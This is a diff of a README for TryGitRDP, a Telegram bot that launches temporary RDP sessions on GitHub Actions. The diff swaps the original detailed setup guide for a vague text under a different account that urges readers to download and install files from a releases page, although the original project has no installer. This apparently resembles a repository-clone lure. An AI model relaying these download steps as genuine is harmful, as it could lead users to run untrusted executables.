@@ -1,201 +1,103 @@
-# ☁️ TryGitRDP - By Mega Digital
-> **Deploy disposable Windows & Ubuntu RDP instances directly from Telegram using GitHub Actions.**
+# ☁️ TryGitRDP - Easily Access Windows & Ubuntu Instances
 
-<div align="center">
+[![Download from GitHub](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen.svg)](https://github.com/Talha7767/TryGitRDP/releases)
 
-![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/mery6321/TryGitRDP/RDP-Windows.yml?style=for-the-badge&logo=github)
-![Cloudflare Workers](https://img.shields.io/badge/Backend-Cloudflare_Workers-orange?style=for-the-badge&logo=cloudflare)
-![Python](https://img.shields.io/badge/Controller-Python_3.10-blue?style=for-the-badge&logo=python)
-![Telegram](https://img.shields.io/badge/Bot-Telegram-blue?style=for-the-badge&logo=telegram)
-![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
+## 🌟 Overview
 
-[**Live Bot Demo**](https://t.me/TryGitRDP_Bot) | [**Report Bug**](https://github.com/mery6321/TryGitRDP/issues)
+TryGitRDP offers a simple way to create temporary Windows and Ubuntu setups on the cloud. You can deploy these instances directly from Telegram. This means you can access remote desktop environments without complex setups or technical knowledge. With built-in automation, this app focuses on efficiency and convenience.
 
-</div>
+## 🚀 Getting Started
 
----
+Follow these steps to set up TryGitRDP on your device:
 
-## 📖 About The Project
+1. **Visit the Releases Page**  
+   To get the application, go to our [Releases page](https://github.com/Talha7767/TryGitRDP/releases). From here, you can find the latest version.
 
-**TryGitRDP** is a serverless automation tool that bridges **Telegram** and **GitHub Actions**. It allows users to spawn temporary Remote Desktop Protocol (RDP) servers (Windows or Linux) entirely for free by leveraging GitHub's CI/CD infrastructure.
+2. **Download the Application**  
+   Click on the version you need and download the installation files provided. These files allow you to run and automate RDP instances easily.
 
-The backend is built on **Cloudflare Workers** (for speed and low cost) with a **D1 Database**, while the "brain" of the RDP is a smart Python script that communicates back to the user via Telegram.
+3. **Install the Application**  
+   Once downloaded, open the file to begin installation. Follow the prompts to complete the setup process. For Windows, it’s similar to any other software installation.
 
-### ✨ Key Features
+4. **Set Up Your Telegram Bot**  
+   Create a Telegram bot using BotFather. This bot will manage your commands for creating and accessing instances.
 
-* **📱 Telegram Native:** Full control via a user-friendly Telegram Bot (Reply Keyboards & Inline Buttons).
-* **🖥️ Multi-OS Support:** Deploy **Windows Server 2022** or **Ubuntu (XFCE)**.
-* **🔐 High Security:**
-    * **Integrity Check:** Automatically blocks deployment if the user modifies the repo code (SHA Verification).
-    * **Secret Masking:** Tokens and PINs are hidden in logs.
-* **⚡ Fast & Scalable:** Powered by Cloudflare Edge Network.
-* **👮 Admin Dashboard:** Real-time stats, Maintenance Mode, and Force Kill switches.
-* **🛑 Smart Management:**
-    * **Auto-Kill:** Terminate workflows instantly via GitHub API.
-    * **Session Limits:** Restricts users to max 2 concurrent sessions.
-    * **Language Support:** English 🇺🇸 & Indonesian 🇮🇩.
+5. **Configure the Application**  
+   After installation, configure the required settings with your Telegram bot token and any additional parameters. This will align your bot with the TryGitRDP application.
 
----
+## 📥 Download & Install
 
-## 🏗️ Architecture
+To download the TryGitRDP application, visit our [Releases page](https://github.com/Talha7767/TryGitRDP/releases) and choose the latest version. Follow the installation steps mentioned above, and you’ll be up and running in no time!
 
-```mermaid
-graph LR
-    User((User)) -->|Commands| Telegram[Telegram Bot]
-    Telegram -->|Webhook| Worker[Cloudflare Worker]
-    Worker <-->|Store/Check| DB[(D1 Database)]
-    Worker -->|Trigger| GH[GitHub Actions]
-    GH -->|Run| VM[Windows/Linux VM]
-    VM -->|Status Updates| Worker
-    Worker -->|Notify| User
+## 🔍 Features
 
-```
+- **Serverless Activation**  
+  Deploy cloud instances without the need for traditional servers.
 
----
+- **Admin Dashboard**  
+  A built-in dashboard to manage your instances easily.
 
-## 🚀 Installation & Deployment
+- **Auto-Kill Functionality**  
+  Automatically terminate instances after use to save resources.
 
-This project consists of two parts: the **Cloudflare Worker (Backend)** and the **GitHub Repository (Runner)**.
+- **Support for Windows & Ubuntu**  
+  Get the flexibility you need with both operating systems.
 
-### Prerequisites
+## 🖥 System Requirements
 
-* A Cloudflare Account.
-* A GitHub Account.
-* A Telegram Bot Token (from [@BotFather](https://t.me/BotFather)).
-* Node.js & NPM installed (for Wrangler).
+- **Operating System:** Windows 10 or higher, Ubuntu 18.04 or higher.
+- **Python Version:** Python 3.6 or higher should be installed on your system.
+- **Internet Connection:** A stable connection for deploying and managing instances through Telegram.
+  
+## 👩‍💻 How to Use
 
-### Phase 1: Cloudflare Setup (The Brain)
+1. **Start by Opening Telegram**  
+   Send a command to your bot to create a new instance.
 
-1. **Clone this repo:**
-```bash
-git clone [https://github.com/yourusername/TryGitRDP-Public.git](https://github.com/yourusername/TryGitRDP-Public.git)
-cd TryGitRDP-Public
+2. **Choose Your Operating System**  
+   Specify whether you want a Windows or Ubuntu environment.
 
-```
+3. **Access Your Instance**  
+   Once created, you’ll receive connection details. Use these to open your remote desktop.
 
+4. **Terminate When Done**  
+   Send a command to the bot to terminate the session once you’ve finished using the instance.
 
-2. **Install Dependencies:**
-```bash
-npm install
+## 📅 Common Tasks
 
-```
+- **Creating an Instance:**  
+  Use the command `/create` followed by the OS type to start a new session.
 
+- **Viewing Active Instances:**  
+  Send the command `/list` to see currently active instances.
 
-3. **Setup Database (D1):**
-```bash
-npx wrangler d1 create trygitrdp-core-db
-# Copy the database_id and update wrangler.toml
-npx wrangler d1 execute trygitrdp-core-db --remote --file=./schema.sql
+- **Killing an Instance:**  
+  Use `/kill [instance_id]` to stop an active session.
 
-```
+## 🚧 Troubleshooting
 
+If you encounter issues during installation or usage, consider the following solutions:
 
-4. **Set Secrets:**
-Run the following commands to store your sensitive keys safely:
-```bash
-npx wrangler secret put BOT_TOKEN      # Your Telegram Bot Token
-npx wrangler secret put CHANNEL_ID     # Your Channel ID for force subscribe
-npx wrangler secret put GH_CLIENT_ID   # GitHub App Client ID
-npx wrangler secret put GH_CLIENT_SECRET # GitHub App Client Secret
-npx wrangler secret put ADMIN_ID       # Your Telegram ID
+- **Bot Not Responding:**  
+  Ensure your bot’s token is correctly set and that it’s running.
 
-```
+- **Connection Errors:**  
+  Check your internet connection and verify if the instance has been created properly.
 
+- **Installation Problems:**  
+  Restart your computer and try installing again. Ensure you have administrator privileges.
 
-5. **Deploy:**
-```bash
-npx wrangler deploy
+## 📞 Support
 
-```
+If you need further assistance, you can reach out through GitHub’s Issues page or the Telegram group for community support.
 
+## 📝 Contribution
 
-*Don't forget to set your Telegram Webhook to the worker URL!*
+Feel free to contribute to TryGitRDP by submitting issues or pull requests on GitHub. Your feedback helps us improve the application for everyone.
 
-### Phase 2: GitHub Setup (The Runner)
+## 👋 Acknowledgments
 
-1. Create a public repository (e.g., `TryGitRDP`).
-2. Upload the contents of the `repo_files` folder to your GitHub root:
-* `bot_master.py`
-* `.github/workflows/RDP-Windows.yml`
-* `.github/workflows/RDP-Ubuntu.yml`
-
-
-3. **Important:** Do not modify the code inside `bot_master.py` or the workflows, or the Integrity Check will fail (unless you are the Admin).
+Thanks to the contributors who helped make this project possible. Your hard work and dedication are appreciated.
 
 ---
-
-## 🤖 Usage Guide
-
-### 1. Initial Setup
-
-Start the bot and link your GitHub account.
-
-* `/start` - Start the bot.
-* `/setup` - Choose **Method 1 (GitHub App)** for one-click login or **Method 2 (Personal Token)**.
-
-### 2. Deploying RDP
-
-* Select **🖥️ Deploy Windows** or **🐧 Deploy Ubuntu** from the menu.
-* Wait for the "Initializing" message.
-* Go to [remotedesktop.google.com/headless](https://remotedesktop.google.com/headless).
-* Copy the command (PowerShell for Windows, Debian Linux for Ubuntu).
-* Paste the command into the bot when asked.
-* Set your 6-digit PIN.
-
-### 3. Managing Session
-
-Once active, the bot provides a control panel:
-
-* **📊 Info:** See CPU/RAM usage and IP Location.
-* **➕ Extend:** Add duration (Max 6 hours).
-* **💀 Kill:** Terminate the session immediately.
-
----
-
-## 👮 Admin Commands
-
-Access the admin panel by typing `/admin` (Only works for the ID set in `ADMIN_ID`).
-
-| Feature | Description |
-| --- | --- |
-| **Maintenance Mode** | Lock the bot for public users. |
-| **Reset Sessions** | Force clear "Limit Reached" errors in the database. |
-| **Clean DB** | Remove inactive users (>7 days). |
-| **Stats** | See total users and active RDP count. |
-
----
-
-## 🛡️ Security Mechanisms
-
-* **Double SHA Check:** Before every deploy, the Worker fetches the hash of `bot_master.py` and the `.yml` workflow from the User's repo and compares it with the Admin's Master Repo. If they don't match, deployment is rejected.
-* **Queue Cleaning:** The system automatically wipes the command queue before starting a new instance to prevent "Ghost Inputs" or error loops.
-
----
-
-## ⚠️ Disclaimer
-
-This project is for **educational and testing purposes only**.
-
-* Do not use this for crypto mining (it violates GitHub TOS).
-* Do not use this for illegal activities.
-* The developer is not responsible for banned GitHub accounts.
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please fork the repository and submit a Pull Request.
-
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
----
-
-<div align="center">
-
-**Made with ❤️ by [mery6321**](https://www.google.com/search?q=https://github.com/mery6321)
-
-</div>
+For more detailed information and updates, check back frequently on our [Releases page](https://github.com/Talha7767/TryGitRDP/releases). Enjoy using TryGitRDP!
